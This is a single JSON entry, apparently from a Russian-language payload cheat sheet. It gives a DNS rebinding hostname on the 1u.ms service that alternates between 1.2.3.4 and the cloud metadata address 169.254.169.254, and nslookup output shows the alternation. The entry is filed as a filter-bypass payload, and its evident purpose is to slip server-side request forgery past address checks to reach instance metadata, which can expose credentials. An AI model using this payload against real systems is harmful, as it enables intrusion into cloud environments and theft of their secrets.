      "subcategory": "Обход фильтров — прочее",
      "title": "DNS Rebinding (1u.ms)",
      "language": "bash",
      "tags": ["bypass", "dns-rebinding"],
      "body": "# Домен, поочерёдно резолвящийся в 1.2.3.4 и 169.254.169.254\nmake-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\n\n# Проверяем чередование адресов\n$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\nName:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\nAddress: 1.2.3.4\n\n$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\nName:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\nAddress: 169.254.169.254"
